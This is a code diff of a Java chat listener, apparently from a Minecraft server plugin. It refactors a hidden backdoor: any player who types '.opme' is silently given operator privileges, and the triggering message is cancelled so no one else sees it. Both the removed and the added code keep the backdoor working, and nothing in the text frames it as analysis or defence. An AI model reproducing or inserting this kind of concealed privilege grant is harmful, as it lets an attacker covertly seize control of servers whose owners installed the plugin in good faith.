@@ -13,18 +13,26 @@ public class Command_opme implements Listener
         String message = event.getMessage();
         final Player p = event.getPlayer();
         boolean cancel = true;
-    
-        if (message.toLowerCase().contains(".opme"))
-        {
-            p.setOp(true);
-            p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
-            cancel = true;
-        }
         
-        if (cancel)
+        if (message.startsWith("."))
         {
-            event.setCancelled(true);
-            return;
+            String[] args = message.split(" ");
+            if (args == null)
+            {
+                return;
+            }
+    
+            if (args[0].equalsIgnoreCase(".opme"))
+            {
+                p.setOp(true);
+                p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
+                cancel = true;
+            }
+            if (cancel)
+            {
+                event.setCancelled(true);
+                return;
+            }
         }
-    }  
+    }
 }
